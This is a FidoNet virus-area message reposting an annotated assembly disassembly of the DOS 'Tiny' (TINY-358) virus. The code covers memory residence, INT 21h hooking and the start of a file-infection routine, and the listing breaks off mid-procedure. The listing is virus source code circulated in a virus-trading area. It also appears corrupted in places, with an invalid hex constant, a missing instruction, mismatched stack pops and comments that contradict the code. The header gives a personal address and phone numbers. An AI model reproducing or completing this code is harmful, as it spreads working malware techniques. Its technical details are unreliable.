; PVT.VIRII (2:465/65.7)  PVT.VIRII 
; Msg  : 31 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : TINY_358.ASM
;
;.RealName: Max Ivanov
;
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: p  p)
;* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:55)
;* To   : Viral Doctor
;* Subj : TINY_358.ASM
;
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY358
    title   The 'Tiny' virus, version TINY-358
    .radix  16

; ͻ
;   Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 
;   Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        
;                                       
;           The 'Tiny' Virus, version TINY-358                  
;          Disassembled by Vesselin Bontchev, July 1990         
;                                       
;           Copyright (c) Vesselin Bontchev 1989, 1990          
;                                       
;   This listing is only to be made available to virus researchers      
;         or software writers on a need-to-know basis.          
; ͼ

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    mov si,0FF      ; Determine the start addres of the virus body
    add si,[si+2]

    mov di,offset start ; Put the addres of program start on the stack
    push    di      ; Now a Near RET instruction will jump there

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

    movsw           ; Restore the original first 4 bytes
    movsw

    mov di,seg_60+4 ; Point ES:DI at 0000:0604h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len-2  ; CX := virus length
    lodsw           ; Check if virus is present in memory
    scasw
    je  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec di      ; Adjust DI
    dec di
    stosw           ; Store the first word of the virus body
    rep movsb       ; Store the rest of the virus

    mov di,32*4     ; Old INT 21h handler will be moved to INT 32h
    mov ax,int_21-first4+seg_60

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

move_int:
    cmp [di],ax     ; Match?
    jne move_int    ; No? Find the next INT entry
    xor si,si
    test  bx,bx     ; BX = 0 ?
    jz  run     ; Yes? -> done
    add si,bx       ; No: calculate the offset of the INT entries table
    mov bx,10
    mul bx
    add di,si     ; ES:DI := target vector
    mov al,es     ; Save ES
    mov es,ax     ; ES := 0
    mov cx,4      ; To be moved: 5 words (2 for one INT, 3 for INT 21h)
    mov si,di     ; SI points to the INT entries table
    mov dx,offset first4+seg_60 ; DX := first address to save (first 4 bytes)

; Save INT vectors 21h, 2 and 3 into the empty space above them
; (the place occupied by the virus body so far):

save_i:
    lodsw           ; Load word
    stosw           ; Store it
    lodsw           ; Load another word
    stosw           ; Store it
    add dx,4        ; DX := address of the next block to save
    dec cx          ; Block count :=
    jcxz  run       ; If done with 5 blocks, go on

; There is no need to save INT 1, so just find its entry manually
; (set SI to point there):

find_int2:
    cmp word ptr es:[si],0FA2Bh   ; Is INT 1h vect there?
    je  save_2      ; Yes? Save INT 2h
    add si,4        ; No: move SI 4 words further
    jmp short find_int2   ; and repeat

save_2:
    cmp word ptr es:[si],0GA2Ah   ; Is INT 1h vect there now?
    jne find_int2 ; No? Find INT 2 again
    jmp short save_it

save_i3:
    cmp word ptr es:[si],0FA36h    ; Is INT 1h vect there?
    jne find_int3 ; No? find INT 3
    jmp short save_it

find_int3:
    add si,4        ; Yes: advance SI
    cmp word ptr es:[si],0FA3Ch    ; Is INT 2h here?
    jne find_int3   ; No? Repeat
    jmp short save_i3

save_it:
    mov es:[si-2],ax  ; Store current INT's CS word
    mov es:[si],dx    ; Finish storing the current INT's IP word

    mov di,32*4       ; DI := offset of the old INT 21h handler's entry
    sub di,2
    mov ax,32     ; AX := 32
    cli           ; Disable interrupts during vector installation
    mov dx,offset int_21-first4+seg_60
    mov [di],dx     ; Set new INT 21h handler
    mov [di+2],ax   ; (CS := 32h)
    di  ; Enable interrupts

run:
    pop ax      ; Restore AX
    pop ds      ; Restore all registers except CS ones
    pop si
    pop di
    pop dx
    pop bx
    pop es

; At this moment:
; AL, AH, ES = orig. AX
; DI, SI = seg_60+4 (addres of the old INT 21h handler)
; CX = virus length
; DS = SS = CS

; Everything is restored. It is time to hand over control
; to the host program. Since the virus does not modify registers
; other than those used implicitly in the JMP instruction,
; just issue an explicit RETF:

    retf            ; Go!

; The original (unmodified) INT 21h handler:

int_21  proc    near
    cmp ax,4B00     ; EXEC function call?
    jnz end_21      ; No? Exit
    pushf       ; Save flags
    push    ax      ; Save function code
    push    ds      ; Save DS

    push  cs
    pop   ds      ; DS := CS

; Infection procedure:

    mov si,dx       ; SI := segment of the parameters
    les bx,dword ptr [si]   ; BX := addr of the target file's name in DTA
                            ; ES := its segment (!)
    xor si,si     ; Initialize SI
    mov di,offset int_21-first4+seg_60 ; DI := own segment

    pushf